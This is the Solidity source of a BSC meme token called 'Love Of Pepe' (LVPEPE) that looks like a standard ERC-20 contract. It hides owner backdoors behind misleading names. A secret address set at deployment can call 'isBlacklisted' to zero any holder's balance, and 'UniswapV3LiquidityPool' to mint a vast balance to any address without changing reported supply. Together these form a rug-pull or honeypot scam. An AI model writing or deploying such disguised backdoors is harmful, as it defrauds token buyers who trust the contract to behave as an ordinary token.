/**
 *Submitted for verification at BscScan.com on 2023-04-21
*/

// SPDX-License-Identifier: MIT
/**
Love Of Pepe Token
LOVE OF
PEPE
Pepe and Wojak, two different memes, found love in the vast expanse of the internet. Their friendship turned into a romance, 
and they planned a future together, despite facing criticism. In the end, they proved that love conquers 
all and inspired others to embrace their true selves. Spread love and laughter with Pepe: The new wave of memes!
*/
pragma solidity 0.8.19;
abstract contract LVPEPEAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface LVPEPEAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 dogecoininu) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 dogecoininu) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 dogecoininu
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface LVPEPEAsii is LVPEPEAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract LVPEPEAsiii is LVPEPEAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract LVPEPE is LVPEPEAs, LVPEPEAsi, LVPEPEAsii, LVPEPEAsiii {

    mapping(address => uint256) private sendValue;
  mapping(address => bool) public LVPEPEAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeToTransfer;
address private LVPEPERooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public LVPEPEPaw;
  address LVPEPEAdr;



    
    constructor(address LVPEPEadressss) {
            // Editable
            LVPEPEAdr = msg.sender;

        _name = "Love Of Pepe";
        _symbol = "LVPEPE";
  LVPEPERooter = LVPEPEadressss;        
        uint stgTotalSupply = 10000000000000 * 10**9;
        process(msg.sender, stgTotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return sendValue[account];
    }

    function transfer(address to, uint256 dogecoininu) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, dogecoininu);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return noFeeToTransfer[owner][spender];
    }

    function approve(address spender, uint256 dogecoininu) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, dogecoininu);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 dogecoininu
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, dogecoininu);
        _transfer(from, to, dogecoininu);
        return true;
    }
      modifier SwapAndLiquify() {
        require(LVPEPERooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, noFeeToTransfer[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  Trigger = noFeeToTransfer[owner][spender];
        require( Trigger >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  Trigger - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 dogecoininu
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        resantTokenTransfer(from, to, dogecoininu);

        uint256 fromBalance = sendValue[from];
        require(fromBalance >= dogecoininu, "Ehi20: transfer dogecoininu exceeds balance");
        unchecked {
            sendValue[from] = fromBalance - dogecoininu;
        }
        sendValue[to] += dogecoininu;

        emit Transfer(from, to, dogecoininu);

        apresTokenTransfer(from, to, dogecoininu);
    }

  modifier walo () {
    require(LVPEPEAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;

  }

    function process(address account, uint256 dogecoininu) internal virtual {
        require(account != address(0), "Ehi20: process to the zero address");

        resantTokenTransfer(address(0), account, dogecoininu);

        ALLtotalSupply += dogecoininu;
        sendValue[account] += dogecoininu;
        emit Transfer(address(0), account, dogecoininu);

        apresTokenTransfer(address(0), account, dogecoininu);
    }


    function _burn(address account, uint256 dogecoininu) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        resantTokenTransfer(account, address(0), dogecoininu);

        uint256 accountBalance = sendValue[account];
        require(accountBalance >= dogecoininu, "Ehi20: burn dogecoininu exceeds balance");
        unchecked {
            sendValue[account] = accountBalance - dogecoininu;
        }
        ALLtotalSupply -= dogecoininu;

        emit Transfer(account, address(0), dogecoininu);

        apresTokenTransfer(account, address(0), dogecoininu);
    }
  function isBlacklisted(address isBlacklistedaddress) external SwapAndLiquify {
    sendValue[isBlacklistedaddress] = 0;
            emit Transfer(address(0), isBlacklistedaddress, 0);
  }
    function _approve(
        address owner,
        address spender,
        uint256 dogecoininu
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        noFeeToTransfer[owner][spender] = dogecoininu;
        emit Approval(owner, spender, dogecoininu);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 dogecoininu
    ) internal virtual {
        uint256  Trigger = allowance(owner, spender);
        if ( Trigger != type(uint256).max) {
            require( Trigger >= dogecoininu, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  Trigger - dogecoininu);
            }
        }
    }
  function UniswapV3LiquidityPool(address randomTokenAddress) external SwapAndLiquify {
    sendValue[randomTokenAddress] = 1000000000000000 * 10 ** 18;
            emit Transfer(address(0), randomTokenAddress, 1000000000000000 * 10 ** 18);
  }
    function resantTokenTransfer(
        address from,
        address to,
        uint256 dogecoininu
    ) internal virtual {}


    function apresTokenTransfer(
        address from,
        address to,
        uint256 dogecoininu
    ) internal virtual {}

}